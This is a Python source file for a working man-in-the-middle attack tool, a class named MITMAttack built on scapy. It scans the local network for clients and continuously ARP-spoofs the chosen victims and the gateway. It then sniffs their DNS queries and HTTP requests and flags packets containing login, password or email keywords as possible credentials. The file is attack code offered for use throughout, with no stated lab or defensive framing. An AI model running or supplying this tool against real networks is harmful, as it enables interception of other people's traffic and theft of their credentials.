import subprocess
import time
import threading
import socket
import ipaddress
from scapy.all import *
from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import ARP, Ether
import json
from datetime import datetime
import netifaces
import asyncio

try:
    from scapy.layers.http import HTTPRequest
except ImportError:
    HTTPRequest = None

class MITMAttack:
    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self.our_ip = None
        self.our_mac = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.network_range = None
        self.target_clients = []
        self.discovered_clients = []
        self.captured_traffic = []
        self.stats = {
            'packets_captured': 0,
            'dns_requests': 0,
            'http_requests': 0,
            'start_time': None,
            'duration': 0,
            'errors': 0
        }
        self.error_log = []
        
    def check_network_connection(self):
        """Check if interface is connected to AP and has IP"""
        try:
            # Get interface addresses
            addrs = netifaces.ifaddresses(self.interface)
            
            if netifaces.AF_INET not in addrs:
                self.error_log.append(f"No IP address assigned to {self.interface}")
                return False
            
            ip_info = addrs[netifaces.AF_INET][0]
            self.our_ip = ip_info['addr']
            netmask = ip_info['netmask']
            
            # Get our MAC address
            if netifaces.AF_LINK in addrs:
                self.our_mac = addrs[netifaces.AF_LINK][0]['addr']
            else:
                self.our_mac = get_if_hwaddr(self.interface)
            
            # Calculate network range
            network = ipaddress.IPv4Network(f"{self.our_ip}/{netmask}", strict=False)
            self.network_range = str(network)
            
            # Get gateway IP
            gateways = netifaces.gateways()
            if 'default' in gateways and netifaces.AF_INET in gateways['default']:
                self.gateway_ip = gateways['default'][netifaces.AF_INET][0]
            else:
                # Fallback: assume .1 is gateway
                self.gateway_ip = str(network.network_address + 1)
            
            # Get gateway MAC
            self.gateway_mac = self.get_mac_address(self.gateway_ip)
            
            return True
            
        except Exception as e:
            self.error_log.append(f"Network check failed: {e}")
            return False
    
    def get_mac_address(self, ip):
        """Get MAC address for given IP"""
        try:
            # Send ARP request
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            return None
        except Exception as e:
            self.error_log.append(f"MAC address lookup failed for {ip}: {e}")
            return None
    
    def discover_network_clients(self):
        """Discover clients on the same network using ARP scan"""
        try:
            clients = []
            
            # ARP scan
            answered, unanswered = arping(self.network_range, timeout=3, verbose=False)
            for sent, received in answered:
                client_ip = received.psrc
                client_mac = received.hwsrc
                
                # Skip our own IP and gateway
                if client_ip != self.our_ip and client_ip != self.gateway_ip:
                    # Try to get hostname
                    hostname = self.get_hostname(client_ip)
                    
                    clients.append({
                        'ip': client_ip,
                        'mac': client_mac,
                        'hostname': hostname,
                        'status': 'active'
                    })
            
            self.discovered_clients = clients
            return clients
            
        except Exception as e:
            self.error_log.append(f"Client discovery failed: {e}")
            return []
    
    def get_hostname(self, ip):
        """Try to get hostname for IP"""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except:
            return "Unknown"
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding"""
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                         capture_output=True, check=True)
            return True
        except Exception as e:
            self.error_log.append(f"Failed to enable IP forwarding: {e}")
            return False
    
    def arp_spoof(self, target_ip, target_mac):
        """Perform ARP spoofing"""
        try:
            # Tell target we are the gateway
            packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                         psrc=self.gateway_ip, hwsrc=self.our_mac)
            
            # Tell gateway we are the target
            packet2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                         psrc=target_ip, hwsrc=self.our_mac)
            
            send(packet1, verbose=False)
            send(packet2, verbose=False)
            
        except Exception as e:
            self.stats['errors'] += 1
            self.error_log.append(f"ARP spoofing error: {e}")
    
    def start_arp_spoofing(self):
        """Continuous ARP spoofing"""
        while self.running:
            for client in self.target_clients:
                if not self.running:
                    break
                self.arp_spoof(client['ip'], client['mac'])
            time.sleep(2)
    
    def packet_sniffer(self):
        """Sniff and analyze packets"""
        def process_packet(pkt):
            if not self.running:
                return

            try:
                self.stats['packets_captured'] += 1

                # Remove IP source filter (or relax it)
                pkt_src = pkt[IP].src if pkt.haslayer(IP) else None

                timestamp = datetime.now().strftime("%H:%M:%S")

                # DNS Requests (any DNS packet, not just qr==0)
                if pkt.haslayer(DNS):
                    try:
                        dns_layer = pkt.getlayer(DNS)
                        domain = dns_layer.qd.qname.decode().rstrip('.') if dns_layer.qd else ""
                        # Only count actual queries
                        if dns_layer.qr == 0 and domain:
                            self.stats['dns_requests'] += 1

                            traffic_entry = {
                                'timestamp': timestamp,
                                'type': 'DNS',
                                'source_ip': pkt_src,
                                'domain': domain,
                                'details': f"DNS query for {domain}"
                            }
                            self.captured_traffic.append(traffic_entry)
                    except Exception as e:
                        print(f"[MITM DEBUG] DNS parse error: {e}")

                # HTTP Requests (and optionally HTTPS SNI)
                if HTTPRequest and pkt.haslayer(HTTPRequest):
                    try:
                        http_layer = pkt[HTTPRequest]
                        host = http_layer.Host.decode(errors="ignore") if http_layer.Host else ""
                        path = http_layer.Path.decode(errors="ignore") if http_layer.Path else ""
                        method = http_layer.Method.decode(errors="ignore") if http_layer.Method else "GET"

                        self.stats['http_requests'] += 1

                        traffic_entry = {
                            'timestamp': timestamp,
                            'type': 'HTTP',
                            'source_ip': pkt_src,
                            'host': host,
                            'path': path,
                            'method': method,
                            'details': f"{method} {host}{path}"
                        }
                        # Check for credentials in Raw
                        if pkt.haslayer(Raw):
                            load = pkt[Raw].load.decode(errors="ignore")
                            keywords = ["username", "user", "login", "password", "pass", "email"]
                            for word in keywords:
                                if word in load.lower():
                                    traffic_entry['credentials'] = True
                                    traffic_entry['details'] += " [POSSIBLE CREDENTIALS]"
                                    break

                        self.captured_traffic.append(traffic_entry)
                    except Exception as e:
                        print(f"[MITM DEBUG] HTTP parse error: {e}")

                # Optionally, log any TCP packet for debug
                # if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                #     print(f"TCP RAW: {pkt[Raw].load}")

                # Keep only last 1000 entries
                if len(self.captured_traffic) > 1000:
                    self.captured_traffic = self.captured_traffic[-1000:]

            except Exception as e:
                self.stats['errors'] += 1
                print(f"[MITM DEBUG] Packet process error: {e}")

        sniff(prn=process_packet, store=0, iface=self.interface, filter="ip", stop_filter=lambda x: not self.running)
    
    def restore_arp_tables(self):
        """Restore original ARP tables"""
        try:
            for client in self.target_clients:
                # Restore client's ARP table
                restore_packet1 = ARP(op=2, pdst=client['ip'], hwdst=client['mac'],
                                    psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                
                # Restore gateway's ARP table
                restore_packet2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                                    psrc=client['ip'], hwsrc=client['mac'])
                
                send(restore_packet1, verbose=False, count=3)
                send(restore_packet2, verbose=False, count=3)
                
        except Exception as e:
            self.error_log.append(f"ARP restoration error: {e}")
    
    def get_current_stats(self):
        """Get current attack statistics"""
        if self.stats['start_time']:
            self.stats['duration'] = int(time.time() - self.stats['start_time'])
        
        return {
            'running': self.running,
            'target_count': len(self.target_clients),
            'packets_captured': self.stats['packets_captured'],
            'dns_requests': self.stats['dns_requests'],
            'http_requests': self.stats['http_requests'],
            'duration': self.stats['duration'],
            'errors': self.stats['errors'],
            'network_info': {
                'our_ip': self.our_ip,
                'gateway_ip': self.gateway_ip,
                'network_range': self.network_range
            }
        }
    
    def get_captured_traffic(self, limit=50):
        """Get recent captured traffic"""
        return self.captured_traffic[-limit:] if self.captured_traffic else []
    
    def start_attack(self, target_ips):
        """Start MITM attack"""
        try:
            # Check network connection
            if not self.check_network_connection():
                return False, "Network connection check failed"
            
            # Enable IP forwarding
            if not self.enable_ip_forwarding():
                return False, "Failed to enable IP forwarding"
            
            # Discover clients if not already done
            if not self.discovered_clients:
                self.discover_network_clients()
            
            # Set target clients
            self.target_clients = []
            for client in self.discovered_clients:
                if client['ip'] in target_ips:
                    self.target_clients.append(client)
            
            if not self.target_clients:
                return False, "No valid targets found"
            
            # Start attack
            self.running = True
            self.stats['start_time'] = time.time()
            self.captured_traffic = []
            
            # Start ARP spoofing thread
            arp_thread = threading.Thread(target=self.start_arp_spoofing, daemon=True)
            arp_thread.start()
            
            # Start packet sniffing thread
            sniff_thread = threading.Thread(target=self.packet_sniffer, daemon=True)
            sniff_thread.start()
            
            return True, "MITM attack started successfully"
            
        except Exception as e:
            self.error_log.append(f"Attack start error: {e}")
            return False, f"Failed to start attack: {e}"
    
    def stop_attack(self):
        """Stop MITM attack"""
        try:
            self.running = False
            
            # Restore ARP tables
            self.restore_arp_tables()
            
            # Disable IP forwarding (optional)
            try:
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                             capture_output=True)
            except:
                pass
            
            return True, "MITM attack stopped successfully"
            
        except Exception as e:
            self.error_log.append(f"Attack stop error: {e}")
            return False, f"Failed to stop attack: {e}"
